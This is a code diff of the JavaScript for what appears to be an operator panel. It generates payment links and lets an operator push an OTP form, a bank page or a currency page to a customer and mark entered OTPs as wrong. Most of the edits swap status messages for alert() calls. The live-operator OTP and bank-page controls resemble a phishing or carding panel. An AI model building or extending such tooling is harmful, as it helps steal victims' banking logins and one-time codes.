@@ -361,7 +361,7 @@
       }
     }
 
-    // Payment Link Generation
+    // ORIGINAL WORKING PAYMENT LINK GENERATION CODE FROM THE PREVIOUS VERSION
     document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const amountInput = document.getElementById('amount');
@@ -387,10 +387,9 @@
 
         document.getElementById('paymentLink').textContent = data.paymentLink;
         linkContainer.style.display = 'block';
-        showMessage('success', 'Payment link generated successfully!');
       } catch (error) {
         console.error('Error:', error);
-        showMessage('error', `Error: ${error.message}`);
+        alert(`Error: ${error.message}`);
         linkContainer.style.display = 'none';
       }
     });
@@ -398,13 +397,8 @@
     // Copy Payment Link
     function copyPaymentLink() {
       const link = document.getElementById('paymentLink').textContent;
-      navigator.clipboard.writeText(link)
-        .then(() => {
-          showMessage('success', 'Link copied to clipboard!', 2000);
-        })
-        .catch(err => {
-          showMessage('error', 'Failed to copy link');
-        });
+      navigator.clipboard.writeText(link);
+      alert('Link copied!');
     }
 
     // Transactions Handling
@@ -506,50 +500,42 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id, redirectStatus: status })
         });
-
-        if (!response.ok) {
-          const data = await response.json();
-          throw new Error(data.message || 'Failed to update status');
-        }
-
-        showMessage('success', `Transaction marked as ${status}`);
+        if (!response.ok) throw new Error('Failed to update status');
+        alert(`Transaction marked as ${status}`);
         loadTransactions();
       } catch (error) {
         console.error('Error updating status:', error);
-        showMessage('error', error.message || 'Failed to update status');
+        alert('Failed to update status');
       }
     }
 
     async function updateStatusWithReason(id, status) {
+      const reasonSelect = document.getElementById(`reason-${id}`);
+      const failureReason = reasonSelect.value;
+      
       try {
-        const reasonSelect = document.getElementById(`reason-${id}`);
-        const failureReason = reasonSelect.value;
-
         const response = await fetch("/api/updateRedirectStatus", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id, redirectStatus: status, failureReason })
         });
-
-        if (!response.ok) {
-          const data = await response.json();
-          throw new Error(data.message || 'Failed to update status with reason');
-        }
-
-        showMessage('success', `Transaction marked as failed with reason: ${getReadableReason(failureReason)}`);
+        if (!response.ok) throw new Error('Failed to update status with reason');
+        
+        // Show a short confirmation message
+        alert(`Transaction marked as failed with reason: ${getReadableReason(failureReason)}`);
         loadTransactions();
       } catch (error) {
         console.error('Error updating status with reason:', error);
-        showMessage('error', error.message || 'Failed to update status with reason');
+        alert('Failed to update status with reason');
       }
     }
 
-    // Currency Page Redirection - FIXED VERSION
+    // UPDATED CURRENCY PAGE REDIRECTION FUNCTION
     async function showCurrencyPage(id) {
       try {
-        // Show loading indicator
-        showMessage('info', 'Redirecting customer to currency page...');
-        
+        const transaction = transactionsMap.get(id);
+        if (!transaction) return;
+
         // Get the pid from the transaction
         const response = await fetch(`/api/getTransactionPid?invoiceId=${id}`);
         if (!response.ok) {
@@ -567,11 +553,10 @@
           pid: data.pid
         });
 
-        console.log(`Currency redirect sent for invoice ${id} with pid ${data.pid}`);
         showMessage('success', 'Currency page shown to customer');
       } catch (error) {
         console.error('Error showing currency page:', error);
-        showMessage('error', 'Failed to show currency page: ' + error.message);
+        alert('Failed to show currency page');
       }
     }
 
@@ -593,17 +578,11 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id })
         });
-
-        if (!response.ok) {
-          const data = await response.json();
-          throw new Error(data.message || 'Failed to show OTP');
-        }
-
-        showMessage('success', 'OTP form shown to customer');
+        if (!response.ok) throw new Error('Failed to show OTP');
         loadTransactions();
       } catch (error) {
         console.error('Error showing OTP:', error);
-        showMessage('error', error.message || 'Failed to show OTP');
+        alert('Failed to show OTP');
       }
     }
 
@@ -614,31 +593,20 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id })
         });
-
-        if (!response.ok) {
-          const data = await response.json();
-          throw new Error(data.message || 'Failed to mark OTP as wrong');
-        }
-
-        showMessage('success', 'OTP marked as incorrect');
+        if (!response.ok) throw new Error('Failed to mark OTP as wrong');
         loadTransactions();
       } catch (error) {
         console.error('Error marking OTP as wrong:', error);
-        showMessage('error', error.message || 'Failed to mark OTP as wrong');
+        alert('Failed to mark OTP as wrong');
       }
     }
 
     async function toggleBankpage(id) {
       const tx = transactionsMap.get(id);
-      try {
-        if (tx.bankpageVisible) {
-          await hideBankPage(id);
-        } else {
-          await showBankpage(id);
-        }
-      } catch (error) {
-        console.error('Error toggling bankpage:', error);
-        showMessage('error', error.message || 'Failed to toggle bank page');
+      if (tx.bankpageVisible) {
+        await hideBankPage(id);
+      } else {
+        await showBankpage(id);
       }
     }
 
@@ -649,17 +617,11 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id })
         });
-
-        if (!response.ok) {
-          const data = await response.json();
-          throw new Error(data.message || 'Failed to show bank page');
-        }
-
-        showMessage('success', 'Bank page shown to customer');
+        if (!response.ok) throw new Error('Failed to show bank page');
         loadTransactions();
       } catch (error) {
         console.error('Error showing bank page:', error);
-        showMessage('error', error.message || 'Failed to show bank page');
+        alert('Failed to show bank page');
       }
     }
 
@@ -670,17 +632,11 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id })
         });
-
-        if (!response.ok) {
-          const data = await response.json();
-          throw new Error(data.message || 'Failed to hide bank page');
-        }
-
-        showMessage('success', 'Bank page hidden');
+        if (!response.ok) throw new Error('Failed to hide bank page');
         loadTransactions();
       } catch (error) {
         console.error('Error hiding bank page:', error);
-        showMessage('error', error.message || 'Failed to hide bank page');
+        alert('Failed to hide bank page');
       }
     }
 
